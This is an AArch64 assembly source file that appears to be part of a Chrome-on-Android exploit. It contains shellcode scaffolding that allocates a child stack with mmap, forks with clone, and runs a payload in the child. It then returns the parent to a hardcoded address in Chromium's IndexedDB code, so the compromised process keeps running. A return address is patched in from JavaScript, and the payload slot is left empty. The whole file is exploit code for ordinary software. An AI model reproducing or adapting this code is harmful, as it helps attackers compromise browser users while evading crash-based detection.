/* 
 * AArch64 shellcode for process continuation. fork()s and 
 * runs shellcode on child process and returns in parent process.
 *
 * Compile with aarch64-linux-android-as shellcode.S -o shellcode.o
 */

.section .text
.global _start

_start:
    b childstack

#
# Placeholder for return address (overwritten by JavaScript bindings)
# Should point to the following location for process continuation to work:
#
# 231de50 <content::IndexedDBDatabase::ProcessRequestQueue()+88>: ldr x8, [x21]
#
ret: .dword 0x4141414141414141

# Create child stack
childstack:
    // mmap(NULL, 0x1000, 3(PROT_READ|PROT_WRITE),
    //      34(MAP_ANONYMOUS|MAP_PRIVATE), -1, 0)
    mov x0, #0
    mov x1, #4096
    mov x2, #3
    mov x3, #34
    mov x4, #-1
    mov x5, #0
    mov x8, #222
    svc #0
    mov x1, x0
    add x1, x1, #4080

# Fork process
fork:
    mov x0, 0
    mov x2, 0
    mov x3, 0
    // clone
    mov x8, #220
    svc #0
	
    cmp x0, #0
    beq shellcode

# Process continuation in parent
continue:
    ldr x30, ret
    ret

# Child process. Replace by actual shellcode.
shellcode:
//    b shellcode
